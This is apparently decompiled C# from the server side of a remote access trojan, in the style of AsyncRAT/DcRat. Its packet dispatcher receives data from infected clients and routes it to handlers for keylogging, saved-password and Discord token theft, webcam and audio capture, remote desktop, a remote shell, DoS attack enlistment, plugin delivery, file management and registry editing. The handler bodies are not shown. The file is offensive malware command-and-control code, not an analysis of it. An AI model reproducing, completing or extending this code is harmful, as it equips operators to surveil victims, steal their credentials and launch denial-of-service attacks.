using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;

namespace Server.Handle_Packet
{
	// Token: 0x0200008D RID: 141
	public class Packet
	{
		// Token: 0x06000442 RID: 1090 RVA: 0x00028F78 File Offset: 0x00027178
		public void Read(object o)
		{
			try
			{
				MsgPack unpack_msgpack = new MsgPack();
				unpack_msgpack.DecodeFromBytes(this.data);
				WaitCallback <>9__1;
				WaitCallback <>9__2;
				Program.form1.Invoke(new MethodInvoker(delegate()
				{
					string asString = unpack_msgpack.ForcePathObject("Pac_ket").AsString;
					uint num = <PrivateImplementationDetails>.ComputeStringHash(asString);
					if (num > 2142761129U)
					{
						if (num <= 2832955486U)
						{
							if (num <= 2252431978U)
							{
								if (num != 2155392417U)
								{
									if (num != 2207001692U)
									{
										if (num != 2252431978U)
										{
											return;
										}
										if (!(asString == "netstat"))
										{
											return;
										}
										new HandleNetstat().GetProcess(this.client, unpack_msgpack);
										return;
									}
									else
									{
										if (!(asString == "thumbnails"))
										{
											return;
										}
										this.client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString;
										new HandleThumbnails(this.client, unpack_msgpack);
										return;
									}
								}
								else
								{
									if (!(asString == "processManager"))
									{
										return;
									}
									new HandleProcessManager().GetProcess(this.client, unpack_msgpack);
									return;
								}
							}
							else if (num <= 2319240225U)
							{
								if (num != 2291602489U)
								{
									if (num != 2319240225U)
									{
										return;
									}
									if (!(asString == "remoteDesktop"))
									{
										return;
									}
									new HandleRemoteDesktop().Capture(this.client, unpack_msgpack);
									return;
								}
								else
								{
									if (!(asString == "Audio"))
									{
										return;
									}
									new HandleAudio().SaveAudio(this.client, unpack_msgpack);
									return;
								}
							}
							else if (num != 2711464212U)
							{
								if (num != 2832955486U)
								{
									return;
								}
								if (!(asString == "fun"))
								{
									return;
								}
								new HandleFun().Fun(this.client, unpack_msgpack);
							}
							else
							{
								if (!(asString == "discordRecovery"))
								{
									return;
								}
								new HandleDiscordRecovery(this.client, unpack_msgpack);
								return;
							}
						}
						else if (num <= 3233163102U)
						{
							if (num != 3011360282U)
							{
								if (num != 3032815688U)
								{
									if (num != 3233163102U)
									{
										return;
									}
									if (!(asString == "ClientInfo"))
									{
										return;
									}
									WaitCallback callBack;
									if ((callBack = <>9__1) == null)
									{
										callBack = (<>9__1 = delegate(object <p0>)
										{
											new HandleListView().AddToListview(this.client, unpack_msgpack);
										});
									}
									ThreadPool.QueueUserWorkItem(callBack);
									return;
								}
								else
								{
									if (!(asString == "keyLogger"))
									{
										return;
									}
									new HandleKeylogger(this.client, unpack_msgpack);
									return;
								}
							}
							else
							{
								if (!(asString == "reportWindow-"))
								{
									return;
								}
								if (!Settings.ReportWindow)
								{
									MsgPack msgPack = new MsgPack();
									msgPack.ForcePathObject("Pac_ket").AsString = "reportWindow";
									msgPack.ForcePathObject("Option").AsString = "stop";
									ThreadPool.QueueUserWorkItem(new WaitCallback(this.client.Send), msgPack.Encode2Bytes());
									return;
								}
								object lockReportWindowClients = Settings.LockReportWindowClients;
								lock (lockReportWindowClients)
								{
									Settings.ReportWindowClients.Add(this.client);
									return;
								}
								goto IL_654;
							}
						}
						else if (num <= 4031341434U)
						{
							if (num != 3644100786U)
							{
								if (num != 4031341434U)
								{
									return;
								}
								if (!(asString == "Po_ng"))
								{
									return;
								}
								new HandlePing().Po_ng(this.client, unpack_msgpack);
								this.client.LastPing = DateTime.Now;
								return;
							}
							else
							{
								if (!(asString == "fileManager"))
								{
									return;
								}
								new HandleFileManager().FileManager(this.client, unpack_msgpack);
								return;
							}
						}
						else if (num != 4086144241U)
						{
							if (num != 4256323669U)
							{
								return;
							}
							if (!(asString == "Information"))
							{
								return;
							}
							new HandleInformation().AddToInformationList(this.client, unpack_msgpack);
							return;
						}
						else
						{
							if (!(asString == "Error"))
							{
								return;
							}
							new HandleLogs().Addmsg("Error from " + this.client.Ip + " client: " + unpack_msgpack.ForcePathObject("Error").AsString, Color.Gainsboro);
							return;
						}
						return;
					}
					if (num <= 1231575816U)
					{
						if (num <= 300022785U)
						{
							if (num != 29539515U)
							{
								if (num != 78554036U)
								{
									if (num != 300022785U)
									{
										return;
									}
									if (!(asString == "shell"))
									{
										return;
									}
									new HandleShell(unpack_msgpack, this.client);
									return;
								}
								else
								{
									if (!(asString == "dosAdd"))
									{
										return;
									}
									new HandleDos().Add(this.client, unpack_msgpack);
									return;
								}
							}
							else
							{
								if (!(asString == "recoveryPassword"))
								{
									return;
								}
								new HandleRecovery(this.client, unpack_msgpack);
								return;
							}
						}
						else if (num != 750979128U)
						{
							if (num != 859067476U)
							{
								if (num != 1231575816U)
								{
									return;
								}
								if (!(asString == "webcam"))
								{
									return;
								}
							}
							else
							{
								if (!(asString == "socketDownload"))
								{
									return;
								}
								new HandleFileManager().SocketDownload(this.client, unpack_msgpack);
								return;
							}
						}
						else
						{
							if (!(asString == "Password"))
							{
								return;
							}
							new HandlePassword().SavePassword(this.client, unpack_msgpack);
							return;
						}
					}
					else if (num <= 1800677779U)
					{
						if (num != 1370058150U)
						{
							if (num != 1559762898U)
							{
								if (num != 1800677779U)
								{
									return;
								}
								if (!(asString == "reportWindow"))
								{
									return;
								}
								new HandleReportWindow(this.client, unpack_msgpack.ForcePathObject("Report").AsString);
								return;
							}
							else
							{
								if (!(asString == "Received"))
								{
									return;
								}
								new HandleListView().Received(this.client);
								this.client.LastPing = DateTime.Now;
								return;
							}
						}
						else
						{
							if (!(asString == "Logs"))
							{
								return;
							}
							new HandleLogs().Addmsg("From " + this.client.Ip + " client: " + unpack_msgpack.ForcePathObject("Message").AsString, Color.Gainsboro);
							return;
						}
					}
					else if (num <= 1933479032U)
					{
						if (num != 1911311572U)
						{
							if (num != 1933479032U)
							{
								return;
							}
							if (!(asString == "fileSearcher"))
							{
								return;
							}
							new HandleFileSearcher().SaveZipFile(this.client, unpack_msgpack);
							return;
						}
						else
						{
							if (!(asString == "sendPlugin"))
							{
								return;
							}
							new HandleLogs().Addmsg("Sending plugin to " + this.client.Ip + " ……", Color.Gainsboro);
							WaitCallback callBack2;
							if ((callBack2 = <>9__2) == null)
							{
								callBack2 = (<>9__2 = delegate(object <p0>)
								{
									this.client.SendPlugin(unpack_msgpack.ForcePathObject("Hashes").AsString);
								});
							}
							ThreadPool.QueueUserWorkItem(callBack2);
							return;
						}
					}
					else if (num != 2099122684U)
					{
						if (num != 2142761129U)
						{
							return;
						}
						if (!(asString == "Ping"))
						{
							return;
						}
						new HandlePing().Ping(this.client, unpack_msgpack);
						this.client.LastPing = DateTime.Now;
						return;
					}
					else
					{
						if (!(asString == "regManager"))
						{
							return;
						}
						new HandleRegManager().RegManager(this.client, unpack_msgpack);
						return;
					}
					IL_654:
					new HandleWebcam(unpack_msgpack, this.client);
				}));
			}
			catch
			{
			}
		}

		// Token: 0x04000309 RID: 777
		public Clients client;

		// Token: 0x0400030A RID: 778
		public byte[] data;
	}
}
